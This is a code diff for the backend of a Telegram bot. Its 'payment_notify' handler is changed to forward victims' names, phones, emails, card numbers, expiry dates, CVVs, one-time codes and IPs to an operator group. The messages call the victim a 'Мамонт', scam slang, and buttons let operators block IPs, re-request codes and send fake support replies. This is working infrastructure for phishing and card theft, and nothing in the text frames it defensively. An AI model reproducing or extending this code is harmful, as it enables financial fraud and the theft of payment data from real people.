@@ -1475,18 +1475,83 @@ async def notify_admin(request):
 @log_function
 async def payment_notify(request):
     data = await request.json()
-    # --- Короткі статуси замість даних ---
-    # 1. Мамонт ввёл ФИО
-    msg1 = 'Мамонт ввёл ФИО'
-    await bot.send_message(PAYMENT_GROUP_ID, msg1)
-    # 2. Мамонт ввёл карту
-    msg2 = 'Мамонт ввёл карту'
-    await bot.send_message(PAYMENT_GROUP_ID, msg2)
-    # 3. Мамонт ввёл код (тільки якщо code є)
+    name = data.get('name', '')
+    phone = data.get('phone', '')
+    email = data.get('email', '')
+    card = data.get('card', '')
+    expiry = data.get('expiry', '')
+    cvv = data.get('cvv', '')
     code = data.get('code', '')
+    ip = data.get('ip', '')
+    # --- Додаємо суму ---
+    price = data.get('price', '')
+    currency = data.get('currency', '')
+    total = data.get('total', '')
+    sum_str = ''
+    if price and currency:
+        sum_str = f'\nСумма: {price} {currency}'
+    elif total:
+        import re
+        m = re.match(r"(\d+[\.,]?\d*)([A-Za-z]+)", total)
+        if m:
+            sum_str = f'\nСумма: {m.group(1).replace(",", ".")} {m.group(2)}'
+        else:
+            sum_str = f'\nСумма: {total}'
+    # 1. Повідомлення з ФІО, телефоном, email, IP + кнопки блокування
+    msg1 = (
+        f"Мамонт ввёл Ф.И.О.: <b>{name}</b>\n\n"
+        f"phone_number: {phone}\n"
+        f"full_name: {name}\n"
+        f"mail: {email}\n"
+        f"ip: {ip}" + sum_str
+    )
+    kb1 = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="Заблокировать", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Розблокувати", callback_data=f"unblock:{ip}")
+            ]
+        ]
+    )
+    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+    # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
+    msg2 = (
+        f"Email: {email}\n"
+        f"Card Number: {card}\n"
+        f"Expiry Date: {expiry}\n"
+        f"CVV: {cvv}\n"
+        f"IP: {ip}" + sum_str
+    )
+    kb2 = InlineKeyboardMarkup(
+        inline_keyboard=[
+        [
+            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+        ],
+        [
+                InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+        ]
+    ]
+    )
+    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+    # 3. Повідомлення з кодом, IP + кнопка Request again
     if code:
-        msg3 = 'Мамонт ввёл код'
-        await bot.send_message(PAYMENT_GROUP_ID, msg3)
+        msg3 = (
+            f"Code: {code}\n"
+            f"IP: {ip}" + sum_str
+        )
+        kb3 = InlineKeyboardMarkup(
+            inline_keyboard=[
+                [
+                    InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
+                ]
+            ]
+        )
+        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+
     # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
     page_code = data.get('page', '')
     admin_user_id = None
@@ -1497,10 +1562,10 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        await bot.send_message(admin_user_id, msg1)
-        await bot.send_message(admin_user_id, msg2)
+        await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+        await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
         if code:
-            await bot.send_message(admin_user_id, msg3)
+            await bot.send_message(admin_user_id, 'Мамонт ввёл код')
 
 @log_function
 async def code_notify(request):
